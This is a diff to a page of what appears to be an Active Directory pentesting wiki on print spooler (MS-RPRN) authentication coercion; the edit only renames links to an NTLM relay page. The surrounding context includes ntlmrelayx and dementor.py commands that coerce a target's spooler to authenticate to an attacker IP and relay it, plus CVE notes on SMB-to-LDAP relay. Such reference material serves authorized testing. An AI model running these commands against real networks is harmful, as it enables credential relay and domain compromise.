@@ -50,7 +50,7 @@ Check if the spooler service is available
 {% endtab %}
 
 {% tab title="ntlmrelayx" %}
-In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../lm-and-ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy.
+In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) and trigger the spooler service of a target via a SOCKS proxy.
 
 ```bash
 ntlmrelayx.py -t smb://$TARGET -socks
@@ -60,7 +60,7 @@ proxychains dementor.py -d $DOMAIN -u $DOMAIN_USER $ATTACKER_IP $TARGET
 {% endtabs %}
 
 {% hint style="info" %}
-**Nota bene**: the coerced NTLM authentication will be made through SMB. This is important because it restricts the possibilites of [NTLM relay](../lm-and-ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMBv2 to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
+**Nota bene**: the coerced NTLM authentication will be made through SMB. This is important because it restricts the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMBv2 to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
 {% endhint %}
 
 ## Resources
